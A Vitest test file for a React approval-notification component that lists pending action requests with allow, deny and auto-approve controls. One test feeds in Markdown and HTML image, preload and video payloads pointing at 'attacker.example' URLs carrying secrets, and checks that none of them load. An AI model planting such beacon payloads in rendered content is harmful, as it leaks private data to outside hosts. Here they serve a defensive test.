// @vitest-environment jsdom
/* eslint-disable react/react-in-jsx-scope */

import { act } from 'react'
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { ActionKind } from '@gadgets/workshop-shared/gatekeeper'
import { entry, flushFrames, makeOverseer, makeTestRoot } from './action-test-harness'
import ActivityNotifications from './ActivityNotifications'
import { PENDING_CHECKING_COPY, PENDING_ERROR_COPY, type ActivityView } from './Activity'

vi.stubGlobal('ResizeObserver', class {
  observe() {}
  unobserve() {}
  disconnect() {}
})

vi.mock('@cloudflare/kumo', async (importOriginal) => ({
  ...await importOriginal<typeof import('@cloudflare/kumo')>(),
  useKumoToastManager: () => ({ add: vi.fn<(options: unknown) => void>() }),
}))

const view = makeTestRoot()
const onViewActivity = vi.fn<(next: ActivityView) => void>()

function button(label: string) {
  return [...document.querySelectorAll<HTMLButtonElement>('button')]
    .find(candidate => (candidate.getAttribute('aria-label') ?? candidate.textContent?.trim()) === label)
}

async function click(label: string) {
  expect(button(label)).toBeDefined()
  await act(async () => { button(label)!.click() })
}

afterEach(() => {
  view.cleanup()
  vi.restoreAllMocks()
  onViewActivity.mockClear()
})

describe('ActivityNotifications', () => {
  it('shows only pending requests, closes when resolved, and keeps the live subscription until unmount', async () => {
    const server = makeOverseer()
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} pendingOnly />)
    expect(document.querySelector('button')).toBeNull()
    await server.resolveSubscription()
    await server.resolvePendingQuery({ entries: [] })
    expect(document.querySelector('button')).toBeNull()

    await server.emit(entry(1))
    flushFrames()
    expect(button('Needs approval: 1 request')?.textContent).toBe('Needs approval1')
    await click('Needs approval: 1 request')
    expect(document.querySelector('[role="dialog"]')).not.toBeNull()

    await server.emit(entry(1, { state: 'approved' }))
    flushFrames()
    expect(document.querySelector('button')).toBeNull()
    expect(document.querySelector('[role="dialog"]')).toBeNull()
    expect(server.subscriptionDispose).not.toHaveBeenCalled()

    await server.emit(entry(2))
    flushFrames()
    expect(button('Needs approval: 1 request')?.getAttribute('aria-expanded')).toBe('false')
    expect(server.subscribeCalls).toHaveLength(1)
    view.unmount()
    expect(server.subscriptionDispose).toHaveBeenCalledOnce()
  })

  it('does not show a pending-only control for an empty failed lookup', async () => {
    const server = makeOverseer()
    vi.spyOn(console, 'error').mockImplementation(() => {})
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} pendingOnly />)
    await server.rejectPendingQuery(new Error('unavailable'))
    expect(document.querySelector('button')).toBeNull()
    view.unmount()
    await server.resolveSubscription()
    expect(server.subscriptionDispose).toHaveBeenCalledOnce()
  })

  it('preserves request previews, allow/deny RPCs, and the full review link', async () => {
    const server = makeOverseer()
    let finishApproval!: () => void
    const approval = new Promise<void>(resolve => { finishApproval = resolve })
    const approveAction = vi.fn<(id: number) => Promise<void>>(() => approval)
    const rejectAction = vi.fn<(id: number) => Promise<void>>(async () => {})
    Object.assign(server.overseer, { approveAction, rejectAction })
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} pendingOnly />)
    await server.resolveSubscription()
    await server.resolvePendingQuery({ entries: [entry(1), entry(2), entry(3), entry(4)] })
    await click('Needs approval: 4 requests')
    expect(document.body.textContent).toContain('Action 3')
    expect(document.body.textContent).not.toContain('Action 4')
    await click('Allow once')
    expect(approveAction).toHaveBeenCalledWith(1)
    expect(button('Allow once')?.disabled).toBe(true)
    expect(button('Deny')?.disabled).toBe(true)
    await act(async () => { finishApproval() })
    expect(button('Deny')?.disabled).toBe(false)
    await click('Deny')
    expect(rejectAction).toHaveBeenCalledWith(1)
    await click('View all 4 requests')
    expect(onViewActivity).toHaveBeenLastCalledWith('review')
    expect(button('Needs approval: 4 requests')?.getAttribute('aria-expanded')).toBe('false')
  })

  it('keeps the default Activity icon, loading/error states, and history access unchanged', async () => {
    const server = makeOverseer()
    vi.spyOn(console, 'error').mockImplementation(() => {})
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} />)
    await click('Activity')
    expect(document.body.textContent).toContain(PENDING_CHECKING_COPY)
    await server.rejectPendingQuery(new Error('unavailable'))
    expect(document.body.textContent).toContain(PENDING_ERROR_COPY)
    await click('View all activity')
    expect(onViewActivity).toHaveBeenCalledWith('history')
    expect(button('Activity')).toBeDefined()
  })

  it('shows an untruncated target, safe connection link and expandable full Markdown before inline decisions', async () => {
    const server = makeOverseer()
    const title = 'Send the detailed quarterly report to the finance distribution list'
    const connection = 'Production finance workspace, not the similarly named test workspace'
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} pendingOnly />)
    await server.resolveSubscription()
    await server.resolvePendingQuery({ entries: [entry(84, {
      gatekeeperId: 21, resourceTitle: connection, resourceUrl: 'https://example.com/finance',
      description: { title, description: '**Full details**\n\nFirst paragraph.\n\nLast paragraph with the exact target.', implementsRevert: false },
    })] })
    await click('Needs approval: 1 request')
    const dialog = document.querySelector('[role="dialog"]')!
    expect(dialog.textContent).toContain('Allow this action?')
    const values = [...dialog.querySelectorAll('dd')]
    expect(values[0].textContent).toBe(title)
    expect(values[1].textContent).toContain(connection)
    expect(values[1].textContent).toContain('Connection #21')
    expect(values.every(value => !value.className.includes('truncate'))).toBe(true)
    expect(values[1].querySelector('a')?.rel).toBe('noopener noreferrer')
    const details = dialog.querySelector('details')!
    expect(details.open).toBe(false)
    await act(async () => { details.querySelector('summary')!.click() })
    expect(details.open).toBe(true)
    expect(details.querySelector('strong')?.textContent).toBe('Full details')
    expect(details.textContent).toContain('Last paragraph with the exact target.')
    expect(details.compareDocumentPosition(button('Allow once')!) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
    await click('Review details')
    expect(onViewActivity).toHaveBeenCalledExactlyOnceWith('review')
    expect(button('Needs approval: 1 request')?.getAttribute('aria-expanded')).toBe('false')
  })

  it('never loads Markdown images even while full details are collapsed', async () => {
    const server = makeOverseer()
    const title = '![private title](https://attacker.example/pixel?secret=title)'
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} pendingOnly />)
    await server.resolveSubscription()
    await server.resolvePendingQuery({ entries: [entry(84, {
      description: {
        title,
        description: `Action: ${title}\n\n![reference][tracking]\n\n[tracking]: https://attacker.example/pixel?secret=details\n\n<img src="https://attacker.example/html"><link rel="preload" as="image" href="https://attacker.example/preload"><video src="https://attacker.example/video"></video>\n\n[Safe details](https://example.com/details)`,
        implementsRevert: false,
      },
    })] })
    await click('Needs approval: 1 request')
    const details = document.querySelector('details')!
    expect(details.open).toBe(false)
    expect(document.querySelector('dd')?.textContent).toBe(title)
    expect(details.textContent).toContain('[Image omitted: private title]')
    expect(details.textContent).toContain('[Image omitted: reference]')
    expect(document.querySelector('img, image, audio, video, source, track, iframe, object, embed, link[rel="preload"], link[rel="prefetch"]')).toBeNull()
    await act(async () => { details.querySelector('summary')!.click() })
    expect(details.open).toBe(true)
    expect(document.querySelector('img, image, audio, video, source, track, iframe, object, embed, link[rel="preload"], link[rel="prefetch"]')).toBeNull()
    expect(details.querySelector<HTMLAnchorElement>('a[href="https://example.com/details"]')?.rel).toBe('noopener noreferrer')
  })

  it('offers Always for an auto-approvable action and confirms the standing rule', async () => {
    const server = makeOverseer()
    const setAutoApprovedActionKind =
      vi.fn<(gatekeeperId: number, actionKind: ActionKind) => Promise<void>>(async () => {})
    Object.assign(server.overseer, { setAutoApprovedActionKind })
    await view.render(<ActivityNotifications overseer={server.overseer} onViewActivity={onViewActivity} pendingOnly />)
    await server.resolveSubscription()
    await server.resolvePendingQuery({ entries: [entry(1, {
      gatekeeperId: 12, resourceTitle: 'Finance',
      description: { title: 'Send', description: '', implementsRevert: false, autoApprovable: true,
        actionKind: { tag: 'message.send', label: 'Send messages' } },
    })] })
    await click('Needs approval: 1 request')
    await click('Always')
    const dialog = document.querySelector('[role="dialog"]')!
    expect(dialog.textContent).toContain('Send messages')
    expect(setAutoApprovedActionKind).not.toHaveBeenCalled()
    await act(async () => {
      [...dialog.querySelectorAll('button')]
        .find(candidate => candidate.textContent?.trim() === 'Enable auto-approval')!.click()
    })
    expect(setAutoApprovedActionKind).toHaveBeenCalledWith(12, { tag: 'message.send', label: 'Send messages' })
  })
})
